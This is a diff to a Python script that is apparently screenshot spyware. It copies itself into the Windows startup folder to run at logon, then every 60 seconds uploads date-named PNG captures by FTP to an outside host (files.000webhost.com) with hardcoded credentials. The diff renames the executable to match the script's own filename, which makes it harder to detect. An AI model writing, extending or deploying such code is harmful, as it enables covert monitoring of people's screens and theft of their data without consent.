@@ -20,7 +20,11 @@ print(script_location)
 
 USER_NAME = getpass.getuser()
 
-filename = "screenshoot.exe"
+filenamepy = os.path.basename(__file__)
+filenameprocess = filenamepy.rfind(".")
+filename = filenamepy[:filenameprocess]
+print(filename)
+filenameexe = f"{filename}.exe"
 
 print(rf"{script_location}\%s" % filename)
 
@@ -52,7 +56,10 @@ def jul():
         jul = Path(rf'{appdata}\jul\%s.png' % date)
         
         #Connexion ftp blablabla upload du fichier
-        session = ftplib.FTP('files.000webhost.com','loutchocsgo','allahwakbar')
+        ftpserveur = 'files.000webhost.com'
+        ftpusername = 'loutchocsgo'
+        ftppassword = 'allahwakbar'
+        session = ftplib.FTP(ftpserveur, ftpusername, ftppassword)
         
         file = open(jul,'rb')
         session.storbinary(f'STOR {jul.name}', file)
@@ -61,14 +68,14 @@ def jul():
         #attendre 60 secondes avant de répeter la tache ducoup
         time.sleep(60)
 
-def add_to_startup(file_path=rf"{script_location}\%s" % filename):
+def add_to_startup(file_path=rf"{script_location}\%s" % filenameexe):
     startuppath = f'{startup}'
-    if Path(f'{startup}\screenshoot.exe').is_file():
+    if Path(rf'{startup}\%s.exe' % filename).is_file():
         jul()
         return
     else:
         shutil.move(file_path, startuppath)
         time.sleep(30)
-        os.startfile(f"{startuppath}\screenshoot.exe")
+        os.startfile(rf"{startuppath}\%s.exe" % filename)
 
 add_to_startup()
